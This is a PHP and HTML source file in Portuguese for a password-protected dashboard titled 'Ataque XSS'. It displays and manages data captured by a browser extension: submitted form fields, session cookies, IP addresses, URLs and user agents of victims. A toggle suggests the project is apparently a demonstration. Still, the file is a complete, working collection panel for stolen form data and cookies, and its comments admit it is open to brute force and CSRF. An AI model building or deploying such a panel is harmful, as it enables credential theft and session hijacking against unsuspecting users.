<?php

/* Carrega informações essenciais (include) */
require_once("config.php");


/*
 * Atenção: essa página não apresenta mecanismos de segurança regulares. Ela está sujeita a brute-force, CSRF, ...
 * O objetivo principal foi apenas montar essa interface gráfica para que os dados submetidos pela extensão possam ser visualizados.
 * É possível melhorar muito a segurança dessa página (que atualmente é apenas uma senha), mas esse não é o intuito do projeto.
*/


/* Obter parâmetros da página */
$action = $_POST["action"];
$passwd = $_POST["passwd"];
$param = $_POST["param"];


function generateItems($assoc) {
	/* Essa função pega itens do banco de dados e gera o HTML deles pra aparecer na página */
	$returnValue = "";
	while($row = $assoc->fetch_assoc()) {
		parse_str($row["data"], $dataObj);
		$dataDiv = "";
		foreach($dataObj as $key => $value) {
			$dataDiv .= "<tr><td><input type='text' readonly='readonly' value='".htmlspecialchars($key)."'></td><td><input type='text' readonly='readonly' value='".htmlspecialchars($value)."'></td></tr>";
		}
		$returnValue .= "<tr data-id='".$row["id"]."' id='".$row["id"]."-trtag'><td>".htmlentities($row["time"])." <a href='javascript:void(0);' data-id='".$row["id"]."' onclick='removeEntry(this);'>(X)</a></td><td>".htmlentities($row["clientId"])."</td><td>".htmlentities($row["ip"])."</td><td>".htmlentities($row["url"])."</td><td>".htmlentities($row["referrer"])."</td><td>".htmlentities($row["userAgent"])."</td><td><a href='javascript:void(0);' data-id='".$row["id"]."-data' onclick='showMore(this);'>Mostrar</a><table id='".$row["id"]."-data' style='display:none;' class='data-table'>".$dataDiv."</table></td><td><a href='javascript:void(0);' data-id='".$row["id"]."-cookies' onclick='showMore(this);'>Mostrar</a><textarea id='".$row["id"]."-cookies' readonly='readonly' style='display:none;'>".htmlspecialchars($row["cookie"])."</textarea></td></tr>";
	}
	return $returnValue;
}

sleep(1); // Dormir script por 1 segundo: ajuda a evitar brute-force no campo de senha.

if($action == "list") {
	/* O administrador acabou de logar e quer carregar a lista de itens pela primeira vez */
	if($passwd != $accessPassword) {
		http_response_code(401);
		echo "Password incorrect.";
		exit();
	}

	$dbCon = new mysqli($dbServer, $dbUsername, $dbPassword, $dbName); // Conecta ao banco de dados.
	if($dbCon->connect_error) {
		http_response_code(500); // Deu erro ao conectar ao banco de dados!
		echo "Could not connect to database." . PHP_EOL;
		exit();
	}

	$dbSql = "SELECT * FROM submits ORDER BY time DESC LIMIT 30"; // Prepara a query SQL para execução: retornar os formulários mais recentemente capturados (no máximo 30 itens).
	$dbQuery = $dbCon->query($dbSql); // Executa a query SQL.

	if ($dbQuery) {
		echo generateItems($dbQuery); // Sucesso. Agora gera o HTML dos itens no banco de dados e retorna ele.
	} else {
		http_response_code(500); // Deu erro ao executar a query SQL!
		echo "Error reading from database." . PHP_EOL;
	}
	exit();
} else if($action == "swapSleep") {
	/* O administrador já está logado e quer trocar o estado da variável $sleep */
	if($passwd != $accessPassword) {
		http_response_code(401);
		echo "Password incorrect.";
		exit();
	}

	if($sleep) { // Caso o script já esteja dormindo 5 segundos ao inserir novos dados...
		file_put_contents("sleep.txt", "false"); // Faz ele parar de dormir.
		echo "Not sleeping anymore.";
	} else { // Caso não esteja dormindo...
		file_put_contents("sleep.txt", "true"); // Faz ele dormir.
		echo "Now sleeping.";
	}
	exit();
} else if($action == "loadMore") {
	/* O administrador já está logado e quer carregar mais itens (itens mais antigos) do banco de dados */
	if($passwd != $accessPassword) {
		http_response_code(401);
		echo "Password incorrect.";
		exit();
	}

	$dbCon = new mysqli($dbServer, $dbUsername, $dbPassword, $dbName); // Conecta ao banco de dados.
	if($dbCon->connect_error) {
		http_response_code(500); // Deu erro ao conectar ao banco de dados!
		echo "Could not connect to database." . PHP_EOL;
		exit();
	}

	$dbSql = "SELECT * FROM submits WHERE id<? ORDER BY time DESC LIMIT 30"; // Prepara a query SQL para execução: retornar os formulários mais recentemente capturados que sejam mais antigos que $param (no máximo, mais 30 itens).
	$dbQuery = $dbCon->prepare($dbSql);
	if(!$dbQuery) { // Erro ao preparar a query SQL.
		http_response_code(500);
		echo "Error preparing query." . PHP_EOL;
		exit();
	}
	$dbQuery->bind_param("s", $param); // $param => o ID do item mais antigo presente na lista atual na tela do administrador.

	if ($dbQuery->execute() === TRUE) { // Executa a query SQL.
		echo generateItems($dbQuery->get_result()); // Sucesso. Agora gera o HTML dos itens no banco de dados e retorna ele.
	} else {
		http_response_code(500); // Deu erro ao executar a query SQL!
		echo "Error reading from database." . PHP_EOL;
	}
	exit();
} else if($action == "update") {
	/* O administrador já está logado e quer carregar mais itens (itens mais recentes) do banco de dados */
	if($passwd != $accessPassword) {
		http_response_code(401);
		echo "Password incorrect.";
		exit();
	}

	$dbCon = new mysqli($dbServer, $dbUsername, $dbPassword, $dbName); // Conecta ao banco de dados.
	if($dbCon->connect_error) {
		http_response_code(500); // Deu erro ao conectar ao banco de dados!
		echo "Could not connect to database." . PHP_EOL;
		exit();
	}

	$dbSql = "SELECT * FROM submits WHERE id>? ORDER BY time DESC"; // Prepara a query SQL para execução: retornar os formulários mais recentemente capturados que sejam mais recentes que $param.
	$dbQuery = $dbCon->prepare($dbSql);
	if(!$dbQuery) { // Erro ao preparar a query SQL.
		http_response_code(500);
		echo "Error preparing query." . PHP_EOL;
		exit();
	}
	$dbQuery->bind_param("s", $param); // $param => o ID do item mais recente presente na lista atual na tela do administrador.

	if ($dbQuery->execute() === TRUE) { // Executa a query SQL.
		echo generateItems($dbQuery->get_result()); // Sucesso. Agora gera o HTML dos itens no banco de dados e retorna ele.
	} else {
		http_response_code(500); // Deu erro ao executar a query SQL!
		echo "Error reading from database." . PHP_EOL;
	}
	exit();
} else if($action == "remove") {
	/* O administrador já está logado e quer remover um item do banco de dados */
	if($passwd != $accessPassword) {
		http_response_code(401);
		echo "Password incorrect.";
		exit();
	}

	$dbCon = new mysqli($dbServer, $dbUsername, $dbPassword, $dbName); // Conecta ao banco de dados.
	if($dbCon->connect_error) {
		http_response_code(500); // Deu erro ao conectar ao banco de dados!
		echo "Could not connect to database." . PHP_EOL;
		exit();
	}

	$dbSql = "DELETE FROM submits WHERE id=?"; // Prepara a query SQL para execução: remove do banco de dados o item identificado por $param.
	$dbQuery = $dbCon->prepare($dbSql);
	if(!$dbQuery) { // Erro ao preparar a query SQL.
		http_response_code(500);
		echo "Error preparing query." . PHP_EOL;
		exit();
	}
	$dbQuery->bind_param("s", $param); // $param => o ID do item que o administrador clicou para remover.

	if ($dbQuery->execute() === TRUE) { // Executa a query SQL.
		echo "Item removed." . PHP_EOL; // Sucesso. O item foi removido do banco de dados.
	} else {
		http_response_code(500); // Deu erro ao executar a query SQL!
		echo "Error reading from database." . PHP_EOL;
	}
	exit();
}

?><!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,user-scalable=no">
	<meta name="robots" content="noindex,nofollow,noarchive,noodp,noydir">
	<title>Ataque XSS</title>
	<style type="text/css">
		@media not all and (min-width: 915px) and (min-height: 350px){
			#main-noscreen {
				display: block;
			}
			#main {
				display:none;
			}
		}
		@media all and (min-width: 915px) and (min-height: 350px){
			#main-noscreen {
				display:none;
			}
			#main {
				display:block;
			}
		}
		body {
			display: block;
			margin: 0 auto;
			background-color: rgb(210, 210, 210);
			color: rgb(0, 0, 0);
		}
		#main {
			font-size: 16px;
			width: 90%;
			min-width: 500px;
			margin: 50px auto;
			background-color: rgb(255, 255, 255);
			border: 1px solid rgb(100, 100, 100);
		}
		#shadow {
			position: fixed;
			top: 0px;
			left: 0px;
			bottom: 0px;
			right: 0px;
			width: 100%;
			height: 100%;
			overflow: hidden;
			background-color: rgba(0, 0, 0, 0.5);
		}
		#header {
			display: block;
			text-align: center;
			font-weight: bold;
		}
		#login, #table {
			width: 100%;
			text-align: center;
		}
		#login input {
			display: block;
			margin: 2px auto;
		}
		#table a {
			display: inline-block;
			color: rgb(50, 119, 255);
			background-color: transparent;
			padding: 5px;
			border-radius: 5px;
			text-decoration: none;
		}
		#table a:hover {
			color: rgb(0, 0, 0);
			background-color: rgb(50, 119, 255);
		}
		#table > table {
			display: block;
			margin-top: 10px;
			margin-bottom: 10px;
			table-layout: fixed;
			width: 100%;
			max-width: 100%;
		}
		#table > table thead {
			color: rgb(255, 255, 255);
			background-color: rgb(0, 0, 0);
			font-weight: bold;
			width: 100%;
			font-size: 1em!important;
		}
		#table > table > tbody > tr {
			margin-top: 4px;
		}
		#table > table > tbody > tr:nth-child(even) {
			background-color: rgb(230, 230, 230);
		}
		#table > table > tbody > tr:nth-child(odd) {
			background-color: rgb(255, 255, 255);
		}
		#table > table td {
			display: inline-block;
			vertical-align: middle;
			text-align: center;
			word-break: break-all;
		}
		#table > table td:nth-child(1) {
			width: 10%;
		}
		#table > table td:nth-child(2) {
			width: 5%;
		}
		#table > table td:nth-child(3) {
			width: 10%;
		}
		#table > table td:nth-child(4) {
			width: 10%;
		}
		#table > table td:nth-child(5) {
			width: 10%;
		}
		#table > table td:nth-child(6) {
			width: 10%;
			font-size: 0.75em;
		}
		#table > table td:nth-child(7) {
			width: 33%;
		}
		#table > table td:nth-child(8) {
			width: 10%;
		}
		#table table td table td {
			width: 49%!important;
		}
		#table table td input {
			width: 100%;
		}
		#table table td textarea {
			width: 100%;
			height: 100px;
		}
		#main-noscreen {
			margin: 3px;
			color: rgb(255,0,0);
			text-align: justify;
		}
	</style>
	<script type="text/javascript" src="jquery.min.js"></script>
	<script type="text/javascript">
		function list() {
			$("#shadow").stop().fadeIn(1000);
			document.getElementById("submit-action").value = "list";
			document.getElementById("submit-param").value = "";
			$.ajax({
				url: "?",
				cache: false,
				method: "POST",
				data: $("#submit-form").serializeArray(),
				dataType: "text",
				timeout: 30000,
				success: function(returnedHTML) {
					document.getElementById("entries").innerHTML = returnedHTML;
					document.getElementById("login").style.display = "none";
					document.getElementById("table").style.display = "block";
				},
				error: function() {
					alert("Não deu certo. Tenta de novo.");
					document.getElementById("login").style.display = "block";
					document.getElementById("table").style.display = "none";
				},
				complete: function() {
					$("#shadow").stop().fadeOut(500);
				}
			});
		}
		function update() {
			$("#shadow").stop().fadeIn(1000);
			var first = document.getElementById("entries").getElementsByTagName("tr");
			if(first.length < 1) {
				return list();
			}
			first = first[0].dataset.id;
			document.getElementById("submit-action").value = "update";
			document.getElementById("submit-param").value = first;
			$.ajax({
				url: "?",
				cache: false,
				method: "POST",
				data: $("#submit-form").serializeArray(),
				dataType: "text",
				timeout: 30000,
				success: function(returnedHTML) {
					document.getElementById("entries").innerHTML = returnedHTML + document.getElementById("entries").innerHTML ;
					document.getElementById("login").style.display = "none";
					document.getElementById("table").style.display = "block";
				},
				error: function() {
					alert("Não deu certo. Tenta de novo.");
					document.getElementById("login").style.display = "block";
					document.getElementById("table").style.display = "none";
				},
				complete: function() {
					$("#shadow").stop().fadeOut(500);
				}
			});
		}
		function loadMore() {
			$("#shadow").stop().fadeIn(1000);
			var last = document.getElementById("entries").childNodes;
			if(last.length < 1) {
				return list();
			}
			last = last[last.length - 1].dataset.id;
			document.getElementById("submit-action").value = "loadMore";
			document.getElementById("submit-param").value = last;
			$.ajax({
				url: "?",
				cache: false,
				method: "POST",
				data: $("#submit-form").serializeArray(),
				dataType: "text",
				timeout: 30000,
				success: function(returnedHTML) {
					document.getElementById("entries").innerHTML += returnedHTML;
					document.getElementById("login").style.display = "none";
					document.getElementById("table").style.display = "block";
				},
				error: function() {
					alert("Não deu certo. Tenta de novo.");
					document.getElementById("login").style.display = "block";
					document.getElementById("table").style.display = "none";
				},
				complete: function() {
					$("#shadow").stop().fadeOut(500);
				}
			});
		}
		function swapSleep() {
			$("#shadow").stop().fadeIn(1000);
			document.getElementById("submit-action").value = "swapSleep";
			document.getElementById("submit-param").value = "";
			$.ajax({
				url: "?",
				cache: false,
				method: "POST",
				data: $("#submit-form").serializeArray(),
				dataType: "text",
				timeout: 30000,
				success: function(returnedText) {
					if(returnedText == "Now sleeping.") {
						document.getElementById("sleepCheck").checked = true;
					} else {
						document.getElementById("sleepCheck").checked = false;
					}
					document.getElementById("login").style.display = "none";
					document.getElementById("table").style.display = "block";
				},
				error: function() {
					alert("Não deu certo. Tenta de novo.");
					document.getElementById("login").style.display = "block";
					document.getElementById("table").style.display = "none";
				},
				complete: function() {
					$("#shadow").stop().fadeOut(500);
				}
			});
		}
		function removeEntry(me) {
			$("#shadow").stop().fadeIn(1000);
			myID = me.dataset.id;
			if(confirm("Tem certeza que deseja remover este item?") != true) {
				$("#shadow").stop().fadeOut(500);
				return;
			}
			document.getElementById("submit-action").value = "remove";
			document.getElementById("submit-param").value = myID;
			$.ajax({
				url: "?",
				cache: false,
				method: "POST",
				data: $("#submit-form").serializeArray(),
				dataType: "text",
				timeout: 30000,
				success: function(returnedHTML) {
					document.getElementById(myID + "-trtag").remove();
					document.getElementById("login").style.display = "none";
					document.getElementById("table").style.display = "block";
				},
				error: function() {
					alert("Não deu certo. Tenta de novo.");
					document.getElementById("login").style.display = "block";
					document.getElementById("table").style.display = "none";
				},
				complete: function() {
					$("#shadow").stop().fadeOut(500);
				}
			});
		}
		function showMore(me) {
			document.getElementById(me.dataset.id).style.display = "block";
			me.outerHTML = "";
		}
		function submitMe(form) {
			var action = document.getElementById("submit-action").value;
			if(action == "list")
				list();
			else if(action == "update")
				update();
			else if(action == "loadMore")
				loadMore();
			else
				swapSleep();
		}
	</script>
</head>

<body style="overflow: auto;">
	<div id="main">
		<div id="shadow" style="display:none;">
		</div>
		<div id="header">
			<h1>Ataques XSS</h1>
		</div>
		<div id="login">
			<form action="javascript:void(0);" id="submit-form" onsubmit="submitMe(this); return false;" method="post">
				<p>Esta página permite que você veja todos os dados capturados pela extensão de navegador.<br>PS.: se a extensão estiver em execução no momento, ela também vai capturar este próprio formulário.<br>Para evitar isso, clique no botão "Entrar" com o mouse ao invés de apertar [ENTER] para submeter a senha.<br></p>
				<input type="password" name="passwd" placeholder="Senha" required="required" autofocus="autofocus">
				<input type="hidden" id="submit-action" name="action" value="list">
				<input type="hidden" id="submit-param" name="param" value="">
				<input type="submit" onclick="submitMe(document.getElementById('submit-form')); return false;" value="Entrar">
			</form>
		</div>
		<div id="table" style="display:none;">
			<a href="javascript:void(0);" onclick="update();">Atualizar/Carregar mais novos</a>
			<table>
				<thead>
					<tr>
						<td>Data</td>
						<td>ID</td>
						<td>IP Origem</td>
						<td>URL</td>
						<td>Referenciador</td>
						<td>Navegador</td>
						<td>Dados</td>
						<td>Cookies</td>
					</tr>
				</thead>
				<tbody id="entries">
				</tbody>
			</table>
			<a href="javascript:void(0);" onclick="loadMore();">Carregar mais antigos</a><br><a href="javascript:void(0)" onclick="swapSleep();" title="Toda vez que um dado for ser capturado, o script vai dormir por 5 segundos para demonstrar que a extensão está em funcionamento."><input type="checkbox" id="sleepCheck" disabled="disabled"<?php if($sleep === true) echo ' checked="checked"'; ?>> Dormir</a>
		</div>
	</div>
	<div id="main-noscreen">
		<span>Sua tela é muito pequena para visualizar esta página da web.</span>
	</div>
</body>

</html>

